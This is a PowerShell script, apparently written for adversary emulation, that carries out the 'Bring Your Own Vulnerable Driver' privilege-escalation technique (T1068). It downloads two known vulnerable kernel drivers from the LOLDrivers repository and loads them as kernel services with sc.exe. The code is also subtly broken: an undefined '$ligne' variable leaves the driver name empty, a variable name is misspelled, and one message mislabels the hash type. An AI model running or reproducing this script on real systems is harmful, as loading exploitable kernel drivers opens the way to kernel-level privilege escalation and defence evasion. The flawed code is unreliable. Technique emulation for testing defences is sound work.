# Bring Your Own Vulnerable Driver
# Technic ID : T1068
Clear-Host
Write-Output "==============================================================================="
Write-Output " Exploitation for Privilege Exploitation (T1068)"
Write-Output "==============================================================================="
################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$StoragePath = "$env:PUBLIC\Toolz";
$LogFile = "$env:PUBLIC\exf\Vuln_Drivers.txt";
$DownloadUrl = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers"
$VulnDriversArray = @(
    [PSCustomObject]@{
        UID     = "89ed5be7ea83c01d0de33d3519944aa5";
        DrvName = "windivert.sys"
    },
    [PSCustomObject]@{
        UID     = "32365e3e64d28cc94756ac9a09b67f06";
        DrvName = "amigendrv64.sys"
    }
)
################ [ FUNCTIONS ] ################
# Function to Download files
function DownloadFiles {
    param(
        [Parameter(Mandatory = $false)]
        [string]$DownloadFrom = $DownloadUrl,
        [Parameter(Mandatory = $true)]
        [string]$DonwnloadedFileName,
        [Parameter(Mandatory = $true)]
        [string]$StorageFileName,
        [Parameter(Mandatory = $false)]
        [string]$StorageDirectory = $StoragePath
    )
    $WhatToDownload = $DownloadFrom + "/" + $DonwnloadedFileName + ".bin"
    $Full_Destination = $StorageDirectory + "\" + $StorageFileName
    $CompleteCommand = "Invoke-WebRequest -Uri " + "$WhatToDownload" + " -outfile " + "$Full_Destination";
    try {
    
        Invoke-Expression  "$CompleteCommand";
        Write-Output "Successfully Downloaded file $DownloadedFileName from $DownloadFrom" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;     
        if ([System.IO.File]::Exists("$Full_Destination")) {
            Write-Output "Successfully Stored file $StorageFileName in $StorageDirectory" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append; 
            # Check downloaded file MD5 summ
            $Md5Check = (Get-FileHash -Path $Full_Destination -Algorithm MD5).Hash
            # Compare CheckSumms
            if ($Md5Check -eq $DonwnloadedFileName) {
                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
                Write-Output " [ MD5SUM checks OK ] Stored File name : $StorageFileName" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
                Write-Output "                     Orignal File name : $DonwnloadedFileName.bin" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
                Write-Output "                     Computed md5 summ : $Md5Check" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
                return                                                
            }
            else {
                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append                
                Write-Output "[ ERROR ] $StorageFileName : somme SHA256 incorrecte." | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
                Write-Output "             Expected summ : $DownloadedFileName" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
                Write-Output "             Computed summ : $Md5Check" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
                exit 3;
            }
        } 
        else {
            Write-Output "The file $Full_Destination does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append; 
            exit 2;
        };

    }
    catch {
        Write-Output "Error : $($_.Exception.Message)" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append; 
        exit 1;   
    }
}
Function InstallDriver {
    param (
        [Parameter(Mandatory = $true)]
        [string]$DriverToInstall,
        [Parameter(Mandatory = $false)]
        [string]$StoredDriverDir = $StoragePath
    )
    # sc.exe create amigendrv64.sys binPath=C:\windows\temp\amigendrv64.sys type=kernel && sc.exe start amigendrv64.sys
    $InstallDriver = "sc.exe create " + $DriverToInstall + " binPath=" + $StoredDriverDir + "\" + $DriverToInstall + " type=kernel"
    Invoke-Expression $InstallDriver  | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
    $StartDriver = "sc.exe start " + $DriverToInstall
    Invoke-Expression $StartDriver  | Out-File -FilePath "$LogFile" -Encoding utf8 -Append        

}
################ [ MAIN BODY ] ################
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Force
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
# Loop to manage each entry in the array.
foreach ($line in $VulnDriversArray) {
    $Source = $line.UID
    $Destination = $ligne.DrvName
    DownloadFiles -DonwnloadedFileName $Source -StorageFileName $Destination
    InstallDriver -DriverToInstall $Destination 
}

